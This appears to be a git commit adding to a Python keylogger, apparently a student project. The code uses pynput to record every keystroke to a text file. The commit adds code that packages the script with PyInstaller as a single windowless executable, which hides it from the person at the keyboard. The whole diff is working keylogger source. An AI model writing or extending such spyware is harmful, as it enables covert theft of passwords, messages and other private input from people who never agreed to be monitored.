226372ae7e1618708262078691a7330486172b66
Jallah Sumbo <j.smbo@alustudent.com>
2024-06-22 22:20:59 +0200

    Add key logging functionality to capture and log keystrokes + saving an exe with + generating an exe

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,18 @@
 from pynput import keyboard
+import sys
+import os
+import subprocess
 
 def keyPressed(key):
+    """
+    Prints the pressed key and appends it to a log file.
+
+    Args:
+        key: The key object representing the pressed key.
+
+    Returns:
+        None
+    """
     print(str(key))
     with open("data/keyfile.txt", 'a') as logKey:
         try:
@@ -13,3 +25,15 @@ if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
+    if getattr(sys, 'frozen', False):
+        # Running as compiled executable
+        current_dir = sys._MEIPASS
+    else:
+        # Running as script
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+
+    # Build the command to create the .exe file
+    command = f'pyinstaller --onefile --noconsole {os.path.join(current_dir, "keylogger.py")}'
+
+    # Run the command
+    subprocess.run(command, shell=True)
